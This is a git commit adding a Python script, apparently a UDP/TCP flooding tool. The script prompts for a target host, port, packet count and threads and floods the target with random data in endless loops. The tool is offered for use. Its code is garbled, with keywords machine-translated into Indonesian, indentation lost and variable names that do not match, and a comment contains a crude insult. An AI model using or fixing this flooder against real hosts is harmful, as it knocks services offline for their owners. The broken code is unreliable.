0c7a9bcc46fda39086d88b00d23b7372bd80fcc3
4zis-151 <91203145+4zis-151@users.noreply.github.com>
2021-09-22 21:04:36 +0700

    Create 4zis.py

---
+++ 4zis.py
@@ -0,0 +1,107 @@
+#!/usr/bin/env python3
+
+#AUTOR OLEH XalBadoR
+
+#GANTI NAMA PM KONTOL
+
+impor acak
+
+soket impor
+
+benang impor
+
+impor os
+
+sistem impor
+
+os.system("hapus")
+
+print("Buat Ulang : XALBADOR")
+
+print("██╗░░██╗##############██")
+
+print("╚██╗██╔╝|Pengarang : 4ZIZ |")
+
+print("░╚███╔╝░|Yang Mau Ganti Nama|")
+
+print("░██╔██╗░|Pm saya !!!! |")
+
+print("██╔╝╚██╗|Tim XalbadorX |")
+
+print("╚═╝░░╚═╝##############██")
+
+ip = str(input("Host/Ip:"))
+
+port = int(input("Port:"))
+
+pilihan = str(input("Gaskan Ga?(y/n):"))
+
+kali = int(input("Paket:"))
+
+benang = int(input("Utas:"))
+
+def menjalankan():
+
+data = acak._urandom(1000)
+
+i = random.choice(("[PERMISI PAKET]","[PERMISI PAKET]","[PERMISI PAKET]"))
+
+sementara Benar:
+
+mencoba:
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+addr = (str(ip),int(port))
+
+for x in range(times):
+
+s.sendto(data,addr)
+
+print(i +" PAKET FROM XALBADORx4ZIZ!!!")
+
+except:
+
+print("[!] SERVER DOWN..!!!")
+
+def run2():
+
+data = random._urandom(16)
+
+i = random.choice(("[PERMIS PAKET]","[PERMISI PAKET]","[PERMISI PAKET]"))
+
+while True:
+
+try:
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((ip,port))
+
+s.send(data)
+
+for x in range(times):
+
+s.send(data)
+
+print(i +" PAKET FROM XALBADORx4ZIZ!!!")
+
+except:
+
+s.close()
+
+print("[*] SERVER DOWN..!!!")
+
+for y in range(threads):
+
+if choice == 'y':
+
+th = threading.Thread(target = run)
+
+th.start()
+
+else :
+
+th = threading.Thread(target = run2)
+
+th.start()kami
